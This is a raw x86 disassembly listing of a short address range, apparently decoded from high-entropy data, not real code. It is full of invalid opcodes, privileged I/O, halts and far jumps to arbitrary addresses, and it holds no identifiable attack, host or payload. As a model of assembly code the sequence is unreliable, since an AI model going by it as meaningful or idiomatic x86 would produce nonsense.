  41d2cc:	std    
  41d2cd:	sbb    bh,BYTE PTR [edx-0x26]
  41d2d0:	scas   al,BYTE PTR es:[edi]
  41d2d1:	outs   dx,BYTE PTR ds:[esi]
  41d2d3:	adc    esp,DWORD PTR [eax-0x27bc9eeb]
  41d2d9:	aad    0x18
  41d2db:	xor    eax,DWORD PTR [ebx-0x2a]
  41d2de:	xchg   BYTE PTR [ebx],al
  41d2e0:	test   eax,0x4cf1c3c8
  41d2e5:	sbb    al,BYTE PTR [ebx-0x59]
  41d2e8:	scas   al,BYTE PTR es:[edi]
  41d2e9:	ss retf 
  41d2eb:	in     eax,0xed
  41d2ed:	add    dl,BYTE PTR [ebp+0x3d]
  41d2f0:	sbb    al,0x68
  41d2f2:	int3   
  41d2f3:	das    
  41d2f4:	jb     0x41d2c4
  41d2f6:	in     eax,0x2b
  41d2f8:	out    dx,eax
  41d2f9:	xor    al,0x51
  41d2fb:	xchg   BYTE PTR ds:0x87d861e4,ah
  41d301:	loopne 0x41d36d
  41d303:	push   ds
  41d304:	imul   edx,DWORD PTR [edx],0xffffff8f
  41d307:	stos   BYTE PTR es:[edi],al
  41d308:	lds    esi,FWORD PTR [eax+0x36b9873c]
  41d30e:	pop    esi
  41d30f:	xor    ah,ah
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx+0xd],0x8f
  41d382:	scas   al,BYTE PTR es:[edi]
  41d383:	dec    bl
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0x72000001
  41d38d:	retf   
  41d38e:	shr    BYTE PTR [ecx+ebp*2+0x54],cl
  41d392:	sbb    DWORD PTR [ecx+ecx*8],edi
  41d395:	mov    edi,0x8b45e931
  41d39a:	ret    
  41d39b:	or     eax,0x92386a
  41d3a0:	cmp    dh,BYTE PTR [ebx-0x1c]
  41d3a3:	sbb    DWORD PTR ds:0x628bb80a,0x3d
  41d3aa:	daa    
  41d3ab:	push   0x78
  41d3ad:	jg     0x41d40b
  41d3af:	mov    bh,0xcb
  41d3b1:	pop    ss
  41d3b2:	out    dx,eax
  41d3b3:	push   DWORD PTR [ebp+eiz*8+0x21b6e082]
  41d3ba:	or     al,0xb9
  41d3bc:	mov    esi,0xa2821553
  41d3c1:	jl     0x41d35c
  41d3c3:	(bad)  
  41d3c4:	jmp    0xc21d:0xaf1462df
  41d3cb:	sub    edi,DWORD PTR [eax+ecx*4+0x74]
  41d3cf:	clc    
  41d3d0:	je     0x41d3a1
  41d3d2:	xchg   edi,eax
  41d3d3:	(bad)  
  41d3d4:	cdq    
  41d3d5:	sahf   
  41d3d6:	xchg   esp,eax
  41d3d7:	(bad)
  41d3db:	mov    edx,0xaf9b41bb
  41d3e0:	or     BYTE PTR [edi+0x6a9a985e],bl
  41d3e6:	pop    ds
  41d3e7:	cdq    
  41d3e8:	jno    0x41d455
  41d3ea:	mov    eax,ds:0xd195a940
  41d3ef:	out    dx,eax
  41d3f0:	inc    ebx
  41d3f1:	call   0x40e0:0x1d1bcff6
  41d3f8:	test   DWORD PTR ds:0x61af,edx
  41d3fd:	jnp    0x41d437
  41d3ff:	adc    eax,0x65c404fd
  41d404:	aam    0x69
  41d406:	jns    0x41d41e
  41d408:	jle    0x41d3a7
  41d40a:	lods   eax,DWORD PTR ds:[esi]
  41d40b:	or     al,BYTE PTR [ecx+edx*2]
  41d40e:	mov    edi,DWORD PTR [esi+0x4e86c811]
  41d414:	aas    
  41d415:	sbb    dh,al
  41d417:	or     BYTE PTR [ebp+0x71ee2491],ch
  41d41d:	sub    al,0x9
  41d41f:	mov    ah,0x9
  41d421:	bound  ebp,QWORD PTR [edi+0x74]
  41d424:	lock ss clc 
  41d427:	mov    edi,0xbfa171b3
  41d42c:	push   ebx
  41d42d:	and    al,0x68
  41d42f:	and    esp,DWORD PTR [edx+0x3e1f3f98]
  41d435:	dec    edi
  41d436:	mov    bh,0x8a
  41d438:	mov    dl,dl
  41d43a:	ror    DWORD PTR [esi+edi*4-0x59650a0a],cl
  41d441:	cmp    DWORD PTR [ebx+0x65],0xffffffad
  41d445:	jmp    0x41d4c0
  41d447:	popf   
  41d448:	xor    al,0x53
  41d44a:	push   ds
  41d44b:	push   edi
  41d44c:	cmc    
  41d44d:	sbb    BYTE PTR [edx+0x52696c6],0x42
  41d454:	in     eax,dx
  41d455:	jns    0x41d423
  41d457:	xchg   BYTE PTR [edi+0xf],bh
  41d45a:	inc    ecx
  41d45b:	stos   DWORD PTR es:[edi],eax
  41d45c:	in     eax,0x12
  41d45e:	pushf  
  41d45f:	dec    ebx
  41d460:	adc    DWORD PTR ds:0xd8c2a05d,ebx
  41d466:	xchg   dl,dh
  41d468:	popf   
  41d469:	push   esi
  41d46a:	mov    esi,0x778e2349
  41d46f:	loope  0x41d49a
  41d471:	shl    dl,cl
  41d473:	sti    
  41d474:	inc    edi
  41d475:	das    
  41d476:	push   ds
  41d477:	mov    esi,0x1e7f3dfd
  41d47c:	popa   
  41d47d:	data16 into 
  41d47f:	fld    DWORD PTR [esi+0x1581de9f]
  41d485:	test   al,0x1d
  41d487:	sub    al,0x93
  41d489:	mov    bl,0xb5
  41d48b:	sahf   
  41d48c:	dec    ebp
  41d48d:	dec    esi
  41d48e:	psrlw  mm6,QWORD PTR [ebx+0x0]
	...
  41d4f2:	add    BYTE PTR [eax],al
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd03f:0x7889dc89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0xa9000001
  41d50d:	or     al,0xad
  41d50f:	dec    esi
  41d510:	test   al,0x3a
  41d512:	aaa    
  41d513:	ss (bad) 
  41d515:	shl    BYTE PTR [edi-0x71d27ec6],1
  41d51b:	add    eax,0x1eb80466
  41d520:	test   DWORD PTR [ecx],esp
  41d522:	mov    WORD PTR [edi+0x3d],ss
  41d525:	sub    bh,BYTE PTR cs:[eax-0x6e]
  41d529:	xchg   esp,eax
  41d52a:	daa    
  41d52b:	mov    ch,0xe
  41d52d:	cmp    eax,0xfb5c75e8
  41d532:	add    al,BYTE PTR [eax]
  41d534:	leave  
  41d535:	or     esi,DWORD PTR [ecx-0x50]
  41d538:	ins    DWORD PTR es:[edi],dx
  41d539:	fsub   QWORD PTR [edi]
  41d53b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d53c:	test   DWORD PTR [ebp-0x6],eax
  41d53f:	bound  ebp,QWORD PTR [ebx+0x3f]
  41d542:	aas    
  41d543:	in     al,dx
  41d544:	or     BYTE PTR [eax+0x48],dl
  41d547:	(bad)  
  41d548:	into   
  41d549:	cmp    eax,0xc21bc652
  41d54e:	fwait
  41d54f:	cmp    BYTE PTR [ecx-0x522949e0],cl
  41d555:	or     al,0x45
  41d557:	xchg   ebp,eax
  41d558:	jmp    0x51cc:0x778c1cf0
  41d55f:	and    esi,ecx
  41d561:	mov    ds:0xc57d8c2a,eax
  41d566:	mov    ds:0x5af93968,al
  41d56b:	lahf   
  41d56c:	jnp    0x41d50d
  41d56e:	test   BYTE PTR [ecx-0x10],bh
  41d571:	mov    cl,0xf2
  41d573:	fs pop edx
  41d575:	jp     0x41d5c8
  41d577:	fld    DWORD PTR [ecx-0x5719a3e6]
  41d57d:	inc    ecx
  41d57e:	hlt    
  41d57f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d580:	mov    bh,0x53
  41d582:	add    BYTE PTR [edi+0x1ca88beb],0x78
  41d589:	imul   ebp,DWORD PTR ds:0xa0018d25,0xffffff96
  41d590:	inc    eax
  41d591:	mov    dl,0xd9
  41d593:	lahf   
  41d594:	aaa    
  41d595:	xchg   BYTE PTR [esi-0x3e],bh
  41d598:	cmp    eax,0x1adc08dd
  41d59d:	fiadd  DWORD PTR [edi+0x45ed4c59]
  41d5a3:	aaa    
  41d5a4:	pop    esp
  41d5a5:	(bad)  
  41d5a6:	jge    0x41d5c7
  41d5a8:	pop    ebx
  41d5a9:	fmul   QWORD PTR [edx+ecx*2]
  41d5ac:	mov    dh,BYTE PTR [esi-0x45]
  41d5af:	fisub  WORD PTR [edi+ecx*4+0x14a06fb5]
  41d5b6:	lods   al,BYTE PTR ds:[esi]
  41d5b7:	mov    eax,0x73afa467
  41d5bc:	mov    al,0xc8
  41d5be:	dec    ebx
  41d5bf:	mov    ebp,0x8e7f0fc7
  41d5c4:	lock fld TBYTE PTR [esp+ebx*8-0x5a]
  41d5c9:	pop    ecx
  41d5ca:	xlat   BYTE PTR ds:[ebx]
  41d5cb:	push   ds
  41d5cc:	ret    0x1a51
  41d5cf:	xchg   BYTE PTR ss:[esi+0x44],dh
  41d5d3:	sbb    ah,BYTE PTR [edx+0x3f]
  41d5d6:	ficomp DWORD PTR ds:0x72a2a435
  41d5dc:	mov    edi,0x23b4d794
  41d5e1:	adc    dh,BYTE PTR [eax+0x54]
  41d5e4:	adc    ebp,DWORD PTR [esi+0x2f600f2e]
  41d5ea:	and    ebp,ebx
  41d5ec:	add    edx,DWORD PTR [ecx+0x29e4ab53]
  41d5f2:	sahf   
  41d5f3:	js     0x41d5e4
  41d5f5:	call   0xe8811619
  41d5fa:	xor    ch,cl
  41d5fc:	rol    BYTE PTR [edx+0x7b10cdec],0x61
  41d603:	mov    ebp,0x2c38fc20
  41d608:	mov    esp,0xb7c3fe2
  41d60d:	sar    cl,0xb3
  41d610:	jecxz  0x41d612
	...
  41d672:	add    BYTE PTR [eax],al
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xd466e435
  41d681:	jo     0x41d654
  41d683:	adc    ebp,edx
  41d685:	cmp    BYTE PTR [ecx],al
  41d687:	add    BYTE PTR ds:0xc1000001,al
  41d68d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d68e:	jmp    0x41d624
  41d690:	xchg   BYTE PTR [ebx],ah
  41d692:	addr16 leave 
  41d694:	retf   0xe268
  41d697:	in     eax,0x5c
  41d699:	pop    ebx
  41d69a:	nop
  41d69b:	xchg   edi,eax
  41d69c:	and    al,bl
  41d69e:	and    DWORD PTR [eax],eax
  41d6a0:	mul    BYTE PTR [ecx]
  41d6a2:	cmp    DWORD PTR [edi],0x5f
  41d6a5:	ins    DWORD PTR es:[edi],dx
  41d6a6:	mov    ds:0xfd8bd951,al
  41d6ab:	rcl    BYTE PTR [ebx+0x7c],cl
  41d6ae:	lods   eax,DWORD PTR ds:[esi]
  41d6af:	or     ah,BYTE PTR [esi]
  41d6b1:	fild   QWORD PTR [edx+0x3eb564c7]
  41d6b7:	das    
  41d6b8:	and    DWORD PTR [ebx-0x2d3d592a],edx
  41d6be:	jmp    0x41d64f
  41d6c0:	push   ebx
  41d6c1:	jecxz  0x41d68b
  41d6c3:	dec    esp
  41d6c4:	ret    
  41d6c5:	dec    edx
  41d6c6:	lock dec ebx
  41d6c8:	jae    0x41d719
  41d6ca:	fdivr  st(1),st
  41d6cc:	repnz or ah,BYTE PTR [ebx-0x6cfd9413]
  41d6d3:	fsubp  st(7),st
  41d6d5:	cs jnp 0x41d6a5
  41d6d8:	jmp    0xb099:0xb941cb2a
  41d6df:	pusha  
  41d6e0:	test   DWORD PTR [edi+0x5f59992],esi
  41d6e6:	push   eax
  41d6e7:	adc    ah,BYTE PTR [eax+0x2b9fbe51]
  41d6ed:	mov    dl,0x8
  41d6ef:	fwait
  41d6f0:	(bad)  
  41d6f1:	clc    
  41d6f2:	(bad)  
  41d6f3:	mov    BYTE PTR [esi],al
  41d6f5:	push   edx
  41d6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6f7:	(bad)  
  41d6f9:	inc    edi
  41d6fa:	aam    0x9a
  41d6fc:	out    dx,al
  41d6fd:	fisttp DWORD PTR [edx]
  41d6ff:	xchg   BYTE PTR [eax+0x14],bh
  41d702:	add    DWORD PTR [esi+esi*4],0x26
  41d706:	out    0xf4,eax
  41d708:	sti    
  41d709:	xor    al,0xe4
  41d70b:	sub    eax,DWORD PTR [ebx-0x20]
  41d70e:	or     BYTE PTR [eax-0x33d100d1],cl
  41d714:	cmp    ecx,DWORD PTR [edx]
  41d716:	inc    esp
  41d717:	mov    dl,BYTE PTR [ebp+eiz*1+0x4c]
  41d71b:	jns    0x41d774
  41d71d:	dec    ebx
  41d71e:	mov    ebx,0xee14d236
  41d723:	xchg   ebx,eax
  41d724:	jg     0x41d71b
  41d726:	adc    BYTE PTR [ebx],cl
  41d728:	and    esp,DWORD PTR [edx+0x7c]
  41d72b:	xchg   esp,eax
  41d72c:	pop    esi
  41d72d:	mov    ah,0x67
  41d72f:	repz iret 
  41d731:	mov    ds:0x77c84490,eax
  41d736:	mov    edx,0x39e96557
  41d73b:	hlt    
  41d73c:	in     eax,0xaa
  41d73e:	mov    ebp,0xe73938d4
  41d743:	in     eax,dx
  41d744:	push   ebp
  41d745:	inc    esp
  41d746:	sbb    BYTE PTR [edx],dh
  41d748:	iret   
  41d749:	add    ebx,DWORD PTR [ebx+0x79]
  41d74c:	xchg   ecx,eax
  41d74d:	test   esi,edi
  41d74f:	xor    DWORD PTR [edi+0x1b],ebx
  41d752:	cli    
  41d753:	cmp    eax,0x23def047
  41d758:	lea    edi,[ebp-0xc]
  41d75b:	scas   eax,DWORD PTR es:[edi]
  41d75c:	cmp    BYTE PTR [ebp-0x5f44d01e],0x6
  41d763:	sbb    al,0xf7
  41d765:	add    DWORD PTR [ecx+0x25],0xffffffc4
  41d769:	(bad)  
  41d76a:	out    0x3a,al
  41d76c:	and    BYTE PTR [esi],bh
  41d76e:	adc    dl,BYTE PTR [ebp-0x2b9d5718]
  41d774:	and    BYTE PTR [esi+0x3f1ba4f1],ch
  41d77a:	jns    0x41d74d
  41d77c:	ds gs loopne 0x41d7a8
  41d780:	jmp    0xe76a:0xc674e07f
  41d787:	mov    es,WORD PTR [ecx-0x5f2f7922]
  41d78d:	jle    0x41d718
  41d78f:	fwait
  41d790:	stos   BYTE PTR es:[edi],al
	...
  41d7f1:	add    BYTE PTR [eax],al
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	pop    ebx
  41d801:	gs js  0x41d85a
  41d804:	fidivr DWORD PTR [ecx]
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    eax,0x34000001
  41d80d:	adc    bh,dh
  41d80f:	mov    ds:0x8a0488c3,al
  41d814:	std    
  41d815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d816:	dec    eax
  41d817:	xchg   DWORD PTR [ebx+esi*8+0x759dd708],edi
  41d81e:	clc    
  41d81f:	inc    ecx
  41d820:	adc    eax,0xc86b98e6
  41d825:	aaa    
  41d826:	xor    al,0x1f
  41d828:	adc    al,BYTE PTR [ebp+0x3b]
  41d82b:	repz and bh,ah
  41d82e:	in     eax,0xae
  41d830:	mov    bl,0xcf
  41d832:	sti    
  41d833:	or     ebp,DWORD PTR [ebx+0x551109bd]
  41d839:	fwait
  41d83a:	pop    ss
  41d83b:	xchg   edx,eax
  41d83c:	ret    0x4f8b
  41d83f:	mov    dl,0xbb
  41d841:	xchg   esi,eax
  41d842:	sbb    DWORD PTR [ecx+0x70de90e0],edi
  41d848:	jge    0x41d838
  41d84a:	fs inc edi
  41d84c:	hlt    
  41d84d:	sub    DWORD PTR [edx+0x43b3cf8a],eax
  41d853:	scas   eax,DWORD PTR es:[edi]
  41d854:	cmp    al,0x30
  41d856:	addr16 test eax,0xc283fd4f
  41d85c:	or     al,0x3a
  41d85e:	stos   BYTE PTR es:[edi],al
  41d85f:	add    DWORD PTR [edx],ecx
  41d861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d862:	retf   
  41d863:	pop    edx
  41d864:	or     DWORD PTR [ebp+0xebbd19b],ecx
  41d86a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d86b:	add    ecx,esp
  41d86d:	in     al,0x88
  41d86f:	adc    bl,ah
  41d871:	and    dl,bl
  41d873:	push   ecx
  41d874:	mov    ds:0x14acf75f,al
  41d879:	mov    DWORD PTR [eax+0x6b],eax
  41d87c:	xchg   edi,eax
  41d87d:	mov    al,0x84
  41d87f:	int    0x88
  41d881:	in     al,dx
  41d882:	call   DWORD PTR [ecx-0x1f]
  41d885:	rcl    DWORD PTR [esi+0x10],0x9d
  41d889:	or     BYTE PTR [edx-0x6e4121e8],0xf7
  41d890:	xor    esi,eax
  41d892:	push   cs
  41d893:	add    ecx,edx
  41d895:	xor    ebx,ebp
  41d897:	jmp    0x41d8cf
  41d899:	mov    dh,0xad
  41d89b:	sbb    bh,BYTE PTR [edi+0x56]
  41d89e:	dec    edi
  41d89f:	mov    dl,0xb6
  41d8a1:	popf   
  41d8a2:	xchg   edx,eax
  41d8a3:	in     al,0x26
  41d8a5:	cmp    al,0x38
  41d8a7:	mov    WORD PTR [esi-0x4],ds
  41d8aa:	or     eax,DWORD PTR [ebp+0x33]
  41d8ad:	pusha  
  41d8ae:	xchg   esp,eax
  41d8af:	sbb    edx,DWORD PTR [eax+0x1dc2ffa0]
  41d8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8b6:	mov    eax,ds:0xc3016f7e
  41d8bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8bc:	and    DWORD PTR [edx],edx
  41d8be:	sub    eax,0xdf30d923
  41d8c3:	and    al,0xd3
  41d8c5:	push   cs
  41d8c6:	mov    ds:0xb01cfb14,eax
  41d8cb:	push   ecx
  41d8cc:	sar    BYTE PTR [eax],1
  41d8ce:	cmp    eax,0xbbd2632
  41d8d3:	mov    eax,0xf70977d5
  41d8d8:	mov    eax,0xccd287f2
  41d8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8de:	pop    ebp
  41d8df:	dec    ecx
  41d8e0:	shl    esp,cl
  41d8e2:	test   BYTE PTR [edx+esi*8],bl
  41d8e5:	ret    0x864
  41d8e8:	xchg   esp,eax
  41d8e9:	shl    BYTE PTR [edi],1
  41d8eb:	xchg   esp,eax
  41d8ec:	hlt    
  41d8ed:	pop    esp
  41d8ee:	lds    esi,FWORD PTR [edx-0x5f]
  41d8f1:	(bad)
  41d8f5:	push   edi
  41d8f6:	into   
  41d8f7:	ret    
  41d8f8:	and    dh,BYTE PTR [ebp+edx*4-0x57]
  41d8fc:	cmp    edi,edx
  41d8fe:	test   al,0x6b
  41d900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d902:	(bad)  
  41d903:	lods   eax,DWORD PTR ds:[esi]
  41d904:	lahf   
  41d905:	bswap  edx
  41d907:	scas   al,BYTE PTR es:[edi]
  41d908:	cli    
  41d909:	sub    dl,BYTE PTR [ebp+0x50]
  41d90c:	call   0x0:0xf01661a1
	...
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs dec ebx
  41d981:	inc    esi
  41d982:	pop    esi
  41d983:	mov    ebp,0x13adf
  41d988:	add    eax,0x54000001
  41d98d:	inc    ecx
  41d98e:	pop    edi
  41d98f:	cmp    esp,0xd3ba81b0
  41d995:	cmp    ebp,DWORD PTR [eax]
  41d997:	pop    eax
  41d998:	neg    DWORD PTR ds:0x297e5455
  41d99e:	mov    ch,0xeb
  41d9a0:	(bad)  
  41d9a1:	mov    ecx,DWORD PTR es:[ecx-0x3]
  41d9a5:	pushf  
  41d9a6:	(bad)  
  41d9a7:	pop    edi
  41d9a8:	xchg   edx,eax
  41d9a9:	ret    0x87ad
  41d9ac:	add    DWORD PTR [esi+0x60],eax
  41d9af:	cmp    BYTE PTR [esi+ebx*8+0x4c],dl
  41d9b3:	adc    ebp,edi
  41d9b5:	sub    al,0x3e
  41d9b7:	ins    DWORD PTR es:[edi],dx
  41d9b8:	stos   DWORD PTR es:[edi],eax
  41d9b9:	je     0x41d9d4
  41d9bb:	je     0x41d99b
  41d9bd:	repnz fiadd DWORD PTR [eax-0x21608a0e]
  41d9c4:	push   0x7
  41d9c6:	popf   
  41d9c7:	xchg   esi,eax
  41d9c8:	jns    0x41d94b
  41d9ca:	xchg   ebx,eax
  41d9cb:	xor    al,0x36
  41d9cd:	mov    edi,0x17a9de36
  41d9d2:	adc    esp,eax
  41d9d4:	mov    al,ds:0x81a371b9
  41d9d9:	popa   
  41d9da:	lods   al,BYTE PTR ds:[esi]
  41d9db:	xchg   edx,eax
  41d9dc:	xchg   BYTE PTR ds:0xcf2275d4,ah
  41d9e2:	jge    0x41d9b5
  41d9e4:	outs   dx,DWORD PTR ds:[esi]
  41d9e5:	mov    ss,WORD PTR [esi]
  41d9e7:	lea    esi,[edi+0x6a]
  41d9ea:	inc    ecx
  41d9eb:	pop    es
  41d9ec:	mov    eax,ds:0x977c7598
  41d9f1:	mov    cl,0x3c
  41d9f3:	add    BYTE PTR [ebp+0x7c],al
  41d9f6:	ret    
  41d9f7:	adc    dh,ch
  41d9f9:	add    ah,BYTE PTR [edi+0x33c0251d]
  41d9ff:	vpunpckhdq xmm7,xmm6,XMMWORD PTR [ebp-0x1d]
  41da04:	imul   ebp,DWORD PTR [ebx-0x7e],0xffffffa2
  41da08:	in     al,0xe4
  41da0a:	fs pop esp
  41da0c:	mov    ds:0x958e48de,al
  41da11:	nop
  41da12:	aam    0x7e
  41da14:	fistp  DWORD PTR [eax+eiz*8+0x2b]
  41da18:	scas   eax,DWORD PTR es:[edi]
  41da19:	iret   
  41da1a:	div    BYTE PTR [esi+0x1d]
  41da1d:	iret   
  41da1e:	dec    edx
  41da1f:	cld    
  41da20:	xor    DWORD PTR [edx+0x1c8b45cc],ebx
  41da26:	(bad)  
  41da27:	out    dx,al
  41da28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da29:	stos   DWORD PTR es:[edi],eax
  41da2a:	jmp    0xb94bd3
  41da2f:	(bad)
  41da33:	in     al,0x8b
  41da35:	fs sbb eax,0x2c05ab1d
  41da3b:	mov    ebx,0xf5ea3f4
  41da40:	js     0x41d9f9
  41da42:	sti    
  41da43:	add    BYTE PTR [edi],0xd4
  41da46:	add    al,0x32
  41da48:	shl    cl,0x11
  41da4b:	inc    ebx
  41da4c:	cmp    DWORD PTR [ebx-0x7db4f394],0xffffffad
  41da53:	mov    eax,ds:0x7f6fc16a
  41da58:	sbb    DWORD PTR [ebx+0x4bd14bd0],esp
  41da5e:	mov    bh,0x8c
  41da60:	xor    al,0x49
  41da62:	adc    DWORD PTR [ebx+0x3],esi
  41da65:	jno    0x41da2d
  41da67:	adc    eax,0xa59cd2a3
  41da6c:	sub    eax,0x243ae9c3
  41da71:	push   0xffffff99
  41da73:	mov    ebp,0xba68bc07
  41da78:	xor    al,0x8e
  41da7a:	ins    DWORD PTR es:[edi],dx
  41da7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da7d:	lahf   
  41da7e:	rcl    DWORD PTR [ecx],cl
  41da80:	pushf  
  41da81:	mov    al,ds:0xca6808c8
  41da86:	js     0x41da95
  41da88:	push   es
  41da89:	ror    DWORD PTR [edx-0x5c],0x90
  41da8d:	add    edi,DWORD PTR [edx+0x99f1]
	...
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffff9e
  41db01:	pop    ss
  41db02:	pop    eax
  41db03:	push   ecx
  41db04:	in     al,0x3b
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0xa2000001
  41db0d:	xchg   BYTE PTR [edx],al
  41db0f:	cdq    
  41db10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db11:	mov    edx,0x83ff411e
  41db16:	mov    eax,0xdb4c3a73
  41db1b:	adc    al,0xcf
  41db1d:	test   eax,0x72450031
  41db22:	dec    ebx
  41db23:	jno    0x41db16
  41db25:	pusha  
  41db26:	pop    esi
  41db27:	pop    eax
  41db28:	(bad)  
  41db29:	fdivr  st(2),st
  41db2b:	mov    gs,WORD PTR [ebx+0x34654472]
  41db31:	dec    eax
  41db32:	imul   ebp,DWORD PTR [ecx],0xa7f06fb1
  41db38:	div    DWORD PTR [esi+0x2b]
  41db3b:	popf   
  41db3c:	adc    eax,0x152cad91
  41db41:	push   0xf36582b3
  41db46:	mul    DWORD PTR [ebp+0x1]
  41db49:	and    DWORD PTR [esi],esp
  41db4b:	jmp    0x41db8f
  41db4d:	cmp    edx,DWORD PTR [ecx]
  41db4f:	push   es
  41db50:	xor    DWORD PTR [ebx+0x11],ebx
  41db53:	pop    esp
  41db54:	add    eax,0x30f7a227
  41db59:	pop    ecx
  41db5a:	retf   0x4e1b
  41db5d:	xchg   ecx,eax
  41db5e:	mov    fs,WORD PTR [ecx-0x3c4fceab]
  41db64:	push   cs
  41db65:	inc    ebp
  41db66:	xchg   esp,eax
  41db67:	retf   0x9650
  41db6a:	adc    al,0x1a
  41db6c:	push   edx
  41db6d:	adc    eax,DWORD PTR [edi-0x70]
  41db70:	jmp    0xf16c:0xd9eba85e
  41db77:	dec    esi
  41db78:	mov    ebx,0x9845be2
  41db7d:	fsubr  st(7),st
  41db7f:	loop   0x41db4d
  41db81:	idiv   BYTE PTR [esi]
  41db83:	xchg   esp,eax
  41db84:	xchg   ebx,eax
  41db85:	scas   al,BYTE PTR es:[edi]
  41db86:	or     BYTE PTR [ecx],cl
  41db88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db89:	jcxz   0x41db69
  41db8c:	ins    BYTE PTR es:[edi],dx
  41db8d:	jle    0x41db97
  41db8f:	cld    
  41db90:	out    0x7f,eax
  41db92:	xchg   ecx,eax
  41db93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db94:	stc    
  41db95:	leave  
  41db96:	repz pop esi
  41db98:	push   cs
  41db99:	int    0x1c
  41db9b:	and    eax,eax
  41db9d:	cwde   
  41db9e:	sar    BYTE PTR [ebx+0x7b],cl
  41dba1:	sub    eax,0x4bf78bf0
  41dba6:	jno    0x41db42
  41dba8:	je     0x41dc06
  41dbaa:	mov    ebp,DWORD PTR [ebx]
  41dbac:	ficomp DWORD PTR [edx]
  41dbae:	je     0x41dbe9
  41dbb0:	xor    BYTE PTR [eax+0x150aeff1],0xf6
  41dbb7:	mov    eax,ds:0x17e0fb00
  41dbbc:	cwde   
  41dbbd:	inc    ecx
  41dbbe:	rol    DWORD PTR [edx],cl
  41dbc0:	repz mov al,ds:0x4ca696ff
  41dbc6:	fisubr DWORD PTR [eax]
  41dbc8:	out    dx,eax
  41dbc9:	iret   
  41dbca:	push   ss
  41dbcb:	lea    ebp,[ecx+edi*1+0x473705f6]
  41dbd2:	arpl   WORD PTR [edx-0x5a888e73],si
  41dbd8:	(bad)  
  41dbd9:	in     eax,dx
  41dbda:	mov    eax,ds:0x806feac
  41dbdf:	push   eax
  41dbe0:	inc    esp
  41dbe1:	or     al,0x57
  41dbe3:	cld    
  41dbe4:	test   eax,0xcbe149aa
  41dbe9:	ins    BYTE PTR es:[edi],dx
  41dbea:	dec    ebx
  41dbeb:	and    ah,BYTE PTR [ecx+0x517deef8]
  41dbf1:	cs (bad) 
  41dbf3:	iret   
  41dbf4:	aam    0x93
  41dbf6:	aad    0xa7
  41dbf8:	pop    esp
  41dbf9:	cdq    
  41dbfa:	std    
  41dbfb:	icebp  
  41dbfc:	fadd   DWORD PTR [ebx]
  41dbfe:	cmp    eax,DWORD PTR ds:0x417c8046
  41dc04:	cmc    
  41dc05:	mov    bl,dl
  41dc07:	aaa    
  41dc08:	iret   
  41dc09:	ins    BYTE PTR es:[edi],dx
  41dc0a:	sbb    DWORD PTR [ebx],esp
  41dc0c:	sbb    al,0xbd
  41dc0e:	or     BYTE PTR [eax+0x29],0x0
	...
  41dc72:	add    BYTE PTR [eax],al
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi-0x304f2fb0]
  41dc81:	stos   BYTE PTR es:[edi],al
  41dc82:	loope  0x41dcd0
  41dc84:	jmp    0x541ddc5
  41dc89:	add    DWORD PTR [eax],eax
  41dc8b:	add    BYTE PTR [ebx],bh
  41dc8d:	push   ds
  41dc8e:	inc    esi
  41dc8f:	std    
  41dc90:	mov    ebp,0x47ee6669
  41dc95:	repz add al,0x8f
  41dc98:	(bad)  
  41dc99:	dec    esp
  41dc9a:	fwait
  41dc9b:	add    BYTE PTR [ecx+0x5491a071],bl
  41dca1:	sbb    eax,0x3101c722
  41dca6:	lods   al,BYTE PTR ds:[esi]
